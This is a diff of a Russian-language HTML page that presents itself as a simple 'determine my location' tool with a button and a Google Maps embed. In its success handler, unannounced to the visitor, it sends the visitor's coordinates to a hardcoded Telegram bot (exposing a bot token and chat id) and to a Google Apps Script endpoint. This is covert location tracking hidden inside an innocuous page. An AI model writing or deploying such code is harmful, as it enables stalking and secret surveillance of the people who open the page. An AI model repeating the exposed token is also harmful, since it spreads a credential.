@@ -9,6 +9,11 @@
       padding: 20px;
       text-align: center;
     }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      margin-top: 20px;
+    }
     #map {
       width: 100%;
       height: 300px;
@@ -25,40 +30,64 @@
 </head>
 <body>
   <h1>📍 Геолокация</h1>
-  <p id="status">⏳ Получение координат...</p>
+  <p id="status">Нажмите кнопку ниже, чтобы определить координаты:</p>
+  <button onclick="getLocation()">📍 Определить местоположение</button>
   <a id="mapLink" href="#" target="_blank" style="display:none;">Открыть в Google Maps</a>
   <div id="map"></div>
 
   <script>
+    function getLocation() {
+      document.getElementById('status').textContent = "⏳ Получение координат...";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        document.getElementById('status').textContent = "❌ Геолокация не поддерживается.";
+      }
+    }
+
     function success(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      // Показать координаты на странице
       document.getElementById('status').textContent =
-        `Ваши координаты:\nШирота: ${latitude}, Долгота: ${longitude}`;
+        `✅ Координаты получены:\nШирота: ${latitude}, Долгота: ${longitude}`;
 
-      // Показать ссылку на карту
       const mapLink = document.getElementById('mapLink');
       mapLink.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
       mapLink.style.display = 'inline-block';
 
-      // Показать встроенную карту
       const mapDiv = document.getElementById('map');
       mapDiv.innerHTML = `<iframe width="100%" height="300" style="border:0"
         src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"
         allowfullscreen></iframe>`;
       mapDiv.style.display = 'block';
 
-      // Отправка в Telegram
+      // Telegram
       fetch("https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: 6249456543,
-          text: `📡 Новая геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}`
+          text: `📡 Геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}`
         })
       });
 
-      // Отправка в Google Таблицу
-      fetch("https://scr
+      // Google Таблица
+      fetch("https://script.google.com/macros/s/AKfycbwfaWCPXIXSAHA5yHrvPl1Nr0uTQ08Tf9pvK0SQMj9KBlDRyiHcIeLsM-jaw0VtYKqrYQ/exec", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          lat: latitude,
+          lon: longitude
+        })
+      });
+    }
+
+    function error(err) {
+      console.error(err);
+      document.getElementById('status').textContent =
+        '❌ Не удалось получить координаты.';
+    }
+  </script>
+</body>
+</html>
